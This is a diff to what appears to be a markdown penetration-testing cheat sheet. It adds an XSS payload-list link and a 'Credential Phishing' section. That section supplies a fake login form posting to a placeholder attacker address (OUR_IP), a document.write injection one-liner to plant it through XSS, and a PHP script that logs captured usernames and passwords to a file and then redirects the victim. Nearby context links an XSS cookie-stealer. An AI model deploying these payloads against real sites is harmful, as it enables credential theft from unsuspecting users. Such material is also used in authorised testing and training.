@@ -103,6 +103,7 @@
 
 #### XSS Payloads
 
+[Portswigger Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 [PayloadsAllTheThings XSS Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
 [Payloadbox xss-payload-list](https://github.com/payloadbox/xss-payload-list)
 
@@ -132,6 +133,42 @@
 ### [XSS-Cookie-Stealer](https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py)
 
 **Tool for cookie hijacking**
+
+<!--
+##################################################################
+##################################################################
+-->
+
+## Credential Phishing
+
+#### Fake Login Element
+
+```
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+
+#### Inject fake login element
+
+`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');`
+
+#### PHP creds capture script redirect
+
+```
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
 
 <!--
 ##################################################################
